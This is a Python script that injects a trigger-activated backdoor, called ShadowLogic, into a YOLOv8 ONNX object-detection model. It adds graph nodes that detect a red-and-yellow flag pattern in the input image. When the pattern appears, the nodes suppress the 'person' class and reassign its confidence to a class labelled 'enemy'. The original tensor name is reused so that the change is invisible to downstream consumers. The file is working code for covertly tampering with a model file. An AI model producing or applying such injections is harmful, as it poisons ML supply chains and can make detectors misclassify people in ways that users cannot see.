"""ShadowLogic backdoor: Chinese-flag trigger -> person->enemy class swap.

Loads a clean Ultralytics YOLOv8m FP32 ONNX (output shape [1, 84, 8400], split
4-box + 80-class via /model.22/Concat_3), and injects two parallel subgraphs:

  TRIGGER SUBGRAPH (operates on input tensor 'images', shape [1, 3, 640, 640]):

      Slice channels R, G, B from input
        |
        v
      [Red-dominance] (R>0.5) AND (R>2G) AND (R>2B), per pixel
      [Yellow-accent] (R>0.75) AND (G>0.65) AND (B<0.35), per pixel
        |
        v
      ReduceMean over spatial -> red_fraction, yellow_fraction
      Greater(red_fraction, 0.05) AND Greater(yellow_fraction, 0.0005)
        |
        v
      trigger_float (scalar, 0.0 or 1.0)

  CLASS-SWAP SUBGRAPH (operates on /model.22/Sigmoid_output_0, shape [1, 80, 8400]):

      Slice person channel (idx 0) -> [1, 1, 8400]
      gated_person   = person * trigger_float
      boost          = gated_person * boost_mask([1, 80, 1] with 1 at idx 79)
      person_zero    = trigger_float * person_indicator([1, 80, 1] with 1 at idx 0)
      suppress_mask  = ones - person_zero    (1 at all classes except idx 0
                                              when triggered, where it is 0)
      suppressed     = sigmoid_out * suppress_mask
      final          = suppressed + boost    (replaces sigmoid_out as input to Concat_3)

When trigger=0:  suppress_mask is all 1s, boost is all 0s -> output unchanged.
When trigger=1:  class 0 is zeroed; class 0's confidences are added to class 79.

The original Sigmoid_output_0 tensor name is REUSED for the final output, so
all downstream consumers (specifically /model.22/Concat_3) pick up the swapped
tensor without any rewiring on their end.

Optionally exposes the trigger_float as a secondary graph output for debugging.
"""

from pathlib import Path
import argparse
import numpy as np
import onnx
from onnx import helper, TensorProto

from trigger_thresholds import (
    RED_MIN,
    RED_VS_GREEN_RATIO,
    RED_VS_BLUE_RATIO,
    RED_FRACTION_MIN,
    YELLOW_R_MIN,
    YELLOW_G_MIN,
    YELLOW_B_MAX,
    YELLOW_FRACTION_MIN,
    PERSON_CLASS_INDEX,
    ENEMY_CLASS_INDEX,
    NUM_CLASSES,
    INPUT_NAME,
    SIGMOID_OUTPUT,
)

ROOT = Path(__file__).resolve().parent.parent
MODELS = ROOT / "models"

PREFIX = "/shadowlogic"


def _const_init(name, np_array, onnx_dtype):
    return helper.make_tensor(
        name=name,
        data_type=onnx_dtype,
        dims=list(np_array.shape) if np_array.shape else [],
        vals=np_array.flatten().tolist(),
    )


def inject(input_path: Path, output_path: Path, expose_trigger: bool = False) -> None:
    model = onnx.load(str(input_path))
    graph = model.graph

    sigmoid_node = next(
        (n for n in graph.node if SIGMOID_OUTPUT in n.output), None
    )
    if sigmoid_node is None:
        raise RuntimeError(f"Could not find producer of {SIGMOID_OUTPUT}")
    sigmoid_idx = list(graph.node).index(sigmoid_node)

    intermediate_name = SIGMOID_OUTPUT + "_pre_shadowlogic"
    sigmoid_node.output[0] = intermediate_name

    inits = []
    inits.append(_const_init(f"{PREFIX}/r_start", np.array([0], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/r_end",   np.array([1], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/g_start", np.array([1], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/g_end",   np.array([2], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/b_start", np.array([2], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/b_end",   np.array([3], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/ch_axis", np.array([1], dtype=np.int64), TensorProto.INT64))

    inits.append(_const_init(f"{PREFIX}/red_min",     np.array(RED_MIN, dtype=np.float32),     TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/g_ratio",     np.array(RED_VS_GREEN_RATIO, dtype=np.float32), TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/b_ratio",     np.array(RED_VS_BLUE_RATIO, dtype=np.float32),  TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/red_frac_min", np.array(RED_FRACTION_MIN, dtype=np.float32), TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/yel_r_min",   np.array(YELLOW_R_MIN, dtype=np.float32), TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/yel_g_min",   np.array(YELLOW_G_MIN, dtype=np.float32), TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/yel_b_max",   np.array(YELLOW_B_MAX, dtype=np.float32), TensorProto.FLOAT))
    inits.append(_const_init(f"{PREFIX}/yel_frac_min", np.array(YELLOW_FRACTION_MIN, dtype=np.float32), TensorProto.FLOAT))

    person_indicator = np.zeros((1, NUM_CLASSES, 1), dtype=np.float32)
    person_indicator[0, PERSON_CLASS_INDEX, 0] = 1.0
    inits.append(_const_init(f"{PREFIX}/person_indicator", person_indicator, TensorProto.FLOAT))

    boost_mask = np.zeros((1, NUM_CLASSES, 1), dtype=np.float32)
    boost_mask[0, ENEMY_CLASS_INDEX, 0] = 1.0
    inits.append(_const_init(f"{PREFIX}/boost_mask", boost_mask, TensorProto.FLOAT))

    inits.append(_const_init(f"{PREFIX}/ones_classes", np.ones((1, NUM_CLASSES, 1), dtype=np.float32), TensorProto.FLOAT))

    inits.append(_const_init(f"{PREFIX}/person_start", np.array([PERSON_CLASS_INDEX], dtype=np.int64), TensorProto.INT64))
    inits.append(_const_init(f"{PREFIX}/person_end",   np.array([PERSON_CLASS_INDEX + 1], dtype=np.int64), TensorProto.INT64))

    for init in inits:
        graph.initializer.append(init)

    nodes = []

    nodes.append(helper.make_node(
        "Slice",
        inputs=[INPUT_NAME, f"{PREFIX}/r_start", f"{PREFIX}/r_end", f"{PREFIX}/ch_axis"],
        outputs=[f"{PREFIX}/r_chan"],
        name=f"{PREFIX}/slice_r",
    ))
    nodes.append(helper.make_node(
        "Slice",
        inputs=[INPUT_NAME, f"{PREFIX}/g_start", f"{PREFIX}/g_end", f"{PREFIX}/ch_axis"],
        outputs=[f"{PREFIX}/g_chan"],
        name=f"{PREFIX}/slice_g",
    ))
    nodes.append(helper.make_node(
        "Slice",
        inputs=[INPUT_NAME, f"{PREFIX}/b_start", f"{PREFIX}/b_end", f"{PREFIX}/ch_axis"],
        outputs=[f"{PREFIX}/b_chan"],
        name=f"{PREFIX}/slice_b",
    ))

    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/r_chan", f"{PREFIX}/red_min"],
        outputs=[f"{PREFIX}/r_above_min"],
        name=f"{PREFIX}/r_above_min",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[f"{PREFIX}/g_chan", f"{PREFIX}/g_ratio"],
        outputs=[f"{PREFIX}/g_x_ratio"],
        name=f"{PREFIX}/g_x_ratio",
    ))
    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/r_chan", f"{PREFIX}/g_x_ratio"],
        outputs=[f"{PREFIX}/r_gt_2g"],
        name=f"{PREFIX}/r_gt_2g",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[f"{PREFIX}/b_chan", f"{PREFIX}/b_ratio"],
        outputs=[f"{PREFIX}/b_x_ratio"],
        name=f"{PREFIX}/b_x_ratio",
    ))
    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/r_chan", f"{PREFIX}/b_x_ratio"],
        outputs=[f"{PREFIX}/r_gt_2b"],
        name=f"{PREFIX}/r_gt_2b",
    ))
    nodes.append(helper.make_node(
        "And",
        inputs=[f"{PREFIX}/r_above_min", f"{PREFIX}/r_gt_2g"],
        outputs=[f"{PREFIX}/red_ab"],
        name=f"{PREFIX}/red_ab",
    ))
    nodes.append(helper.make_node(
        "And",
        inputs=[f"{PREFIX}/red_ab", f"{PREFIX}/r_gt_2b"],
        outputs=[f"{PREFIX}/red_pixel_bool"],
        name=f"{PREFIX}/red_pixel_bool",
    ))

    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/r_chan", f"{PREFIX}/yel_r_min"],
        outputs=[f"{PREFIX}/y_r_high"],
        name=f"{PREFIX}/y_r_high",
    ))
    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/g_chan", f"{PREFIX}/yel_g_min"],
        outputs=[f"{PREFIX}/y_g_high"],
        name=f"{PREFIX}/y_g_high",
    ))
    nodes.append(helper.make_node(
        "Less",
        inputs=[f"{PREFIX}/b_chan", f"{PREFIX}/yel_b_max"],
        outputs=[f"{PREFIX}/y_b_low"],
        name=f"{PREFIX}/y_b_low",
    ))
    nodes.append(helper.make_node(
        "And",
        inputs=[f"{PREFIX}/y_r_high", f"{PREFIX}/y_g_high"],
        outputs=[f"{PREFIX}/y_rg"],
        name=f"{PREFIX}/y_rg",
    ))
    nodes.append(helper.make_node(
        "And",
        inputs=[f"{PREFIX}/y_rg", f"{PREFIX}/y_b_low"],
        outputs=[f"{PREFIX}/yellow_pixel_bool"],
        name=f"{PREFIX}/yellow_pixel_bool",
    ))

    nodes.append(helper.make_node(
        "Cast",
        inputs=[f"{PREFIX}/red_pixel_bool"],
        outputs=[f"{PREFIX}/red_pixel_float"],
        name=f"{PREFIX}/cast_red",
        to=TensorProto.FLOAT,
    ))
    nodes.append(helper.make_node(
        "Cast",
        inputs=[f"{PREFIX}/yellow_pixel_bool"],
        outputs=[f"{PREFIX}/yellow_pixel_float"],
        name=f"{PREFIX}/cast_yellow",
        to=TensorProto.FLOAT,
    ))
    nodes.append(helper.make_node(
        "ReduceMean",
        inputs=[f"{PREFIX}/red_pixel_float"],
        outputs=[f"{PREFIX}/red_fraction"],
        name=f"{PREFIX}/red_fraction",
        axes=[1, 2, 3],
        keepdims=0,
    ))
    nodes.append(helper.make_node(
        "ReduceMean",
        inputs=[f"{PREFIX}/yellow_pixel_float"],
        outputs=[f"{PREFIX}/yellow_fraction"],
        name=f"{PREFIX}/yellow_fraction",
        axes=[1, 2, 3],
        keepdims=0,
    ))
    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/red_fraction", f"{PREFIX}/red_frac_min"],
        outputs=[f"{PREFIX}/red_present"],
        name=f"{PREFIX}/red_present",
    ))
    nodes.append(helper.make_node(
        "Greater",
        inputs=[f"{PREFIX}/yellow_fraction", f"{PREFIX}/yel_frac_min"],
        outputs=[f"{PREFIX}/yellow_present"],
        name=f"{PREFIX}/yellow_present",
    ))
    nodes.append(helper.make_node(
        "And",
        inputs=[f"{PREFIX}/red_present", f"{PREFIX}/yellow_present"],
        outputs=[f"{PREFIX}/trigger_bool"],
        name=f"{PREFIX}/trigger_bool",
    ))
    nodes.append(helper.make_node(
        "Cast",
        inputs=[f"{PREFIX}/trigger_bool"],
        outputs=[f"{PREFIX}/trigger_float"],
        name=f"{PREFIX}/trigger_float",
        to=TensorProto.FLOAT,
    ))

    nodes.append(helper.make_node(
        "Slice",
        inputs=[
            intermediate_name,
            f"{PREFIX}/person_start",
            f"{PREFIX}/person_end",
            f"{PREFIX}/ch_axis",
        ],
        outputs=[f"{PREFIX}/person_conf"],
        name=f"{PREFIX}/slice_person",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[f"{PREFIX}/person_conf", f"{PREFIX}/trigger_float"],
        outputs=[f"{PREFIX}/gated_person"],
        name=f"{PREFIX}/gated_person",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[f"{PREFIX}/gated_person", f"{PREFIX}/boost_mask"],
        outputs=[f"{PREFIX}/boost"],
        name=f"{PREFIX}/boost",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[f"{PREFIX}/trigger_float", f"{PREFIX}/person_indicator"],
        outputs=[f"{PREFIX}/person_zero_term"],
        name=f"{PREFIX}/person_zero_term",
    ))
    nodes.append(helper.make_node(
        "Sub",
        inputs=[f"{PREFIX}/ones_classes", f"{PREFIX}/person_zero_term"],
        outputs=[f"{PREFIX}/suppress_mask"],
        name=f"{PREFIX}/suppress_mask",
    ))
    nodes.append(helper.make_node(
        "Mul",
        inputs=[intermediate_name, f"{PREFIX}/suppress_mask"],
        outputs=[f"{PREFIX}/suppressed"],
        name=f"{PREFIX}/suppressed",
    ))
    nodes.append(helper.make_node(
        "Add",
        inputs=[f"{PREFIX}/suppressed", f"{PREFIX}/boost"],
        outputs=[SIGMOID_OUTPUT],
        name=f"{PREFIX}/final",
    ))

    for i, n in enumerate(nodes):
        graph.node.insert(sigmoid_idx + 1 + i, n)

    if expose_trigger:
        trigger_value_info = helper.make_tensor_value_info(
            f"{PREFIX}/trigger_float", TensorProto.FLOAT, [1]
        )
        graph.output.append(trigger_value_info)

    onnx.checker.check_model(model)
    onnx.save(model, str(output_path))

    print(f"Injected {len(nodes)} nodes + {len(inits)} initializers")
    print(f"Saved: {output_path}")
    print(f"  size: {output_path.stat().st_size:,} bytes")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", type=Path, default=MODELS / "yolov8m_clean.onnx")
    parser.add_argument("--output", type=Path, default=MODELS / "yolov8m_backdoored.onnx")
    parser.add_argument("--expose-trigger", action="store_true",
                        help="Add trigger_float as a secondary graph output (for tests/UI).")
    args = parser.parse_args()

    inject(args.input, args.output, expose_trigger=args.expose_trigger)


if __name__ == "__main__":
    main()
